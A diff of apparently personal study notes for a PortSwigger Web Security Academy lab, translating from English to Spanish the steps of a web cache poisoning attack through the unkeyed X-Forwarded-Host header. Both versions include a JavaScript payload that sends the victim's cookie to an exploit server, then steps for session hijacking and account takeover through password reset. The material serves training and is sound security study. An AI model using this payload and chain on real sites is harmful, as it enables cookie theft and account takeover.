@@ -2018,22 +2018,22 @@ Resumen:
 
 - Unkeyed header
 
-GET req to home page with cache buster ?cb=1234\
-Add `X-Forwarded-Host` with host example.com or google.com\
+GET /?cb=1234\
+Cabecera `X-Forwarded-Host` con host example.com o google.com\
 Send\
-See if host is reflected in response in /resources/js/tracking.js\
-See if `X-Cache: hit` is present\
-In exploit server, change file name to match the path used by the vulnerable response: /resources/js/tracking.js\
-In body `document.location='https://<exploitID>.web-security-academy.net/cookie.php?c='+document.cookie;`\
-Put the exploit server in the GET Request in Burp:\
-X-Forwarded-Host: exploit-ID.web-security-academy.net\
-Get rid of cache-bust\
-Submit Twice to get X-Cache: hit\
-In Exploit Server view logs for users cookie.\
-Turn on Intercept, click to go to My Account page and substitute in the cookie every time till you are logged in as Carlos.\
-Change the Email address and use the same cookie substitution.\
-Turn off Intercept.\
-Go to MyAccount and Forgot Password. Send password request for Carlos and view the email in Exploit server for Token to change password.\
+Se refleja respuesta en /resources/js/tracking.js?\
+Mirar si `X-Cache: hit` está\
+exploit server > cambiar el nombre del fichero para matchear la ruta: /resources/js/tracking.js\
+Cuerpo `document.location='https://<exploitID>.web-security-academy.net/cookie.php?c='+document.cookie;`\
+Meter el exploit server en la petición GET de Burp:\
+`X-Forwarded-Host: exploit-ID.web-security-academy.net`\
+Quitar cache buster\
+Enviar dos veces para pillar el `X-Cache: hit`\
+Mirar logs del exp server para la cookie.\
+Encender el Intercept > click en My Account > sustituir la cookie todo el tiempo hasta que nos logeemos como Carlos.\
+Cambiar la dir de email y usar la misma sustitución de cookie.\
+Quitar el Intercept.\
+Ir a MyAccount > Forgot Password. Enviar solicitud de password request para Carlos y mirar en el Exploit server para el token de cambio de password.\
 
 - Reset password
 
